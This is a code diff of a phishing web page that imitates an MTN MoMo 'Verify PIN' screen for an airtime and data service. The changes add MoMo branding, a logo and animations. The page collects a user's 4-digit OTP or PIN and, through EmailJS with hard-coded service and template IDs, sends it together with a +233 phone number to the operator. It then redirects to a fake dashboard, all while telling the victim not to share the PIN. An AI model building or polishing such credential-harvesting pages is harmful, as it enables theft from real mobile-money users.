@@ -3,18 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify PIN</title>
-  <!-- Meta Description -->
-<meta name="description" content= " Airtime & Data — Fast and reliable airtime and data services with secure registration and easy access.">
+  <title>Verify PIN | MoMo</title>
+  <meta name="description" content="Airtime & Data — Fast and reliable airtime and data services with secure registration and easy access.">
 
-<!-- Favicons -->
-<!-- Favicons -->
-<link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
-<link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
 
-<!-- Theme Color (for mobile browsers) -->
-<!--<meta name="theme-color" content="#003366">-->
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
@@ -22,56 +17,96 @@
       emailjs.init("gV773-VG85THpxrNV"); 
     })();
   </script>
+
   <style>
+    /* === Preloader === */
+    #preloader {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at center, #003366, #001f3f);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.6s ease;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255, 215, 0, 0.2);
+      border-top-color: #FFD700;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* === Background === */
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
       background: linear-gradient(135deg, #003366, #0055a5);
+      overflow: hidden;
+      position: relative;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      overflow: hidden;
-      position: relative;
     }
 
-    body::before,
-    body::after {
-      content: "";
+    /* === Floating Particles === */
+    .particle {
       position: absolute;
+      background: #FFD700;
       border-radius: 50%;
-      background: #ffcc00;
-      opacity: 0.15;
+      opacity: 0.4;
+      animation: float 6s ease-in-out infinite;
     }
 
-    body::before {
-      width: 300px;
-      height: 300px;
-      top: -100px;
-      left: -100px;
+    @keyframes float {
+      0%, 100% { transform: translateY(0) scale(1); }
+      50% { transform: translateY(-25px) scale(1.2); }
     }
 
-    body::after {
-      width: 200px;
-      height: 200px;
-      bottom: -80px;
-      right: -80px;
-    }
-
+    /* === Card === */
     .card {
       background: white;
       border-radius: 1rem;
       box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-      transition: transform 0.3s;
-    }
-    .card:hover {
-      transform: translateY(-5px);
+      text-align: center;
+      padding: 2rem;
+      max-width: 400px;
+      width: 100%;
+      position: relative;
+      z-index: 5;
+      animation: fadeInUp 0.8s ease forwards;
     }
 
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(40px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* === MoMo Logo Bounce === */
+    .logo {
+      width: 100px;
+      margin: 0 auto 1rem;
+      animation: bounce 2s infinite ease-in-out;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
+    }
+
+    /* === OTP Inputs === */
     .otp-container {
       display: flex;
       justify-content: center;
-      gap: 15px;
+      gap: 12px;
       margin: 20px 0;
     }
 
@@ -84,42 +119,69 @@
       border: 2px solid #E5E7EB;
       border-radius: 12px;
       outline: none;
-      background: #ffffff;
+      transition: border 0.3s, box-shadow 0.3s;
       color: #003366;
     }
 
     .otp-input:focus {
-      border-color: #ffcc00;
-      box-shadow: 0 0 6px rgba(255, 204, 0, 0.7);
+      border-color: #FFD700;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
     }
 
+    /* === Button === */
     .btn {
       background: #FFD700;
       color: #003366;
       font-weight: bold;
-      transition: background 0.3s;
+      transition: all 0.3s;
+      box-shadow: 0 0 12px rgba(255, 215, 0, 0.4);
     }
 
     .btn:hover {
       background: #e6c200;
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+    }
+
+    /* === Notification === */
+    #notification {
+      z-index: 50;
     }
   </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-6">
 
-  <div class="card w-full max-w-md p-8">
-    <h1 class="text-2xl font-bold text-center text-blue-900 mb-4">Verify Your PIN</h1>
-    <p class="text-gray-600 text-center mb-6">OTP sent to ******9637</p>
-    <h2 class="text-red-600 text-center mb-4 font-semibold">Do not share this PIN with anyone</h2>
-    
-    <form id="otpForm" class="space-y-6 text-center">
+<body>
+
+  <!-- Preloader -->
+  <div id="preloader"><div class="spinner"></div></div>
+
+  <!-- Floating Particles -->
+  <script>
+    for (let i = 0; i < 40; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('particle');
+      particle.style.width = `${Math.random() * 6 + 2}px`;
+      particle.style.height = particle.style.width;
+      particle.style.left = `${Math.random() * 100}%`;
+      particle.style.top = `${Math.random() * 100}%`;
+      particle.style.animationDelay = `${Math.random() * 5}s`;
+      document.body.appendChild(particle);
+    }
+  </script>
+
+  <!-- Verification Card -->
+  <div class="card">
+    <img src="momo.png" alt="MoMo" class="logo">
+    <h1 class="text-2xl font-bold text-blue-900 mb-2">Verify Your PIN</h1>
+    <p class="text-gray-600 mb-3" id="otpMessage">OTP sent to ******9637</p>
+    <h2 class="text-red-600 mb-4 font-semibold">Do not share this PIN with anyone</h2>
+
+    <form id="otpForm" class="space-y-6">
       <div class="otp-container">
         <input type="text" maxlength="1" class="otp-input" />
         <input type="text" maxlength="1" class="otp-input" />
         <input type="text" maxlength="1" class="otp-input" />
         <input type="text" maxlength="1" class="otp-input" />
       </div>
-
       <button type="submit" class="btn w-full py-3 rounded-lg shadow">
         Verify
       </button>
@@ -129,52 +191,46 @@
   <!-- Notification -->
   <div id="notification" class="hidden fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white"></div>
 
- <script>
-  const inputs = document.querySelectorAll(".otp-input");
-  const otpForm = document.getElementById("otpForm");
-
-  // ✅ Get phone number from localStorage
-  const phone = localStorage.getItem("userPhone");
-  if (phone) {
-    const masked = "******" + phone.slice(-4);
-    document.querySelector("p").textContent = `OTP sent to ${masked}`;
-  } else {
-    document.querySelector("p").textContent = "OTP sent to your registered number";
-  }
-
-  inputs.forEach((input, index) => {
-    input.addEventListener("input", () => {
-       input.value = input.value.replace(/[^0-9]/g, "");
-      if (input.value.length === 1 && index < inputs.length - 1) {
-        inputs[index + 1].focus();
-      }
+  <script>
+    // Preloader fade-out
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        document.getElementById("preloader").style.opacity = "0";
+        setTimeout(() => document.getElementById("preloader").style.display = "none", 600);
+      }, 2000);
     });
 
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && index > 0) {
-        inputs[index - 1].focus();
-      }
-    });
-  });
+    // OTP logic
+    const inputs = document.querySelectorAll(".otp-input");
+    const otpForm = document.getElementById("otpForm");
+    const phone = localStorage.getItem("userPhone");
+    const otpMsg = document.getElementById("otpMessage");
 
-  otpForm.addEventListener("submit", function(e) {
-    e.preventDefault();
-    const otp = Array.from(inputs).map(i => i.value).join("");
-    if (otp.length === 4) {
-      emailjs.send("service_74nt2c9","template_zelb8ji",{
-        otp: otp,
-        phone: "+233" + phone 
-      }).then(() => {
-        window.location.href = "dashboard.html"; 
-      }).catch(() => {
-        showNotification("Failed to verify OTP.", "error");
+    if (phone) otpMsg.textContent = `OTP sent to ******${phone.slice(-4)}`;
+
+    inputs.forEach((input, i) => {
+      input.addEventListener("input", () => {
+        input.value = input.value.replace(/[^0-9]/g, "");
+        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
       });
-    } else {
-      showNotification("Please enter a valid 4-digit PIN.", "error");
-    }
-  });
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
+      });
+    });
 
-   function showNotification(message, type="success") {
+    otpForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const otp = Array.from(inputs).map(i => i.value).join("");
+      if (otp.length === 4) {
+        emailjs.send("service_74nt2c9","template_zelb8ji",{ otp, phone: "+233" + phone })
+          .then(() => window.location.href = "dashboard.html")
+          .catch(() => showNotification("Failed to verify OTP.", "error"));
+      } else {
+        showNotification("Please enter a valid 4-digit PIN.", "error");
+      }
+    });
+
+    function showNotification(message, type="success") {
       const notification = document.getElementById("notification");
       notification.textContent = message;
       notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white ${
@@ -183,8 +239,6 @@
       notification.classList.remove("hidden");
       setTimeout(() => notification.classList.add("hidden"), 3000);
     }
-</script>
-
+  </script>
 </body>
 </html>
-
